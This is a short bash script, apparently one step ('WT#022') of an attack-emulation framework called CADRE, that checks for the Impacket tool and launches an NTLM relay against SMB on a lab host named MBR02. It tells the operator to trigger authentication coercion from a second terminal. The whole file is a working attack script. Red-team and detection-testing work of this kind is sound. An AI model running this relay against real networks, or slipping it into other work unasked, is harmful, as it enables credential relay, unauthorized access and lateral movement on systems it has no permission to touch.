#!/bin/bash
# CADRE — WT#022 NTLM Relay to SMB
SOURCE="${BASH_SOURCE[0]}"
ATTACK_IP="${1:-$(hostname -I | awk '{print $1}')}"
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#022 — NTLM Relay to SMB"
start_attack "022" "NTLM Relay to SMB"

require_tool impacket-ntlmrelayx
require_env ATTACK_IP "ATTACK_IP"
require_env MBR02 "MBR02"

step "Step 1: Start NTLM relay targeting SMB on MBR02"
step "NOTE: Run this in a separate terminal, then trigger coercion from another terminal"
run_cmd "impacket-ntlmrelayx -t smb://$MBR02 -smb2support"

result $? "NTLM Relay to SMB completed"
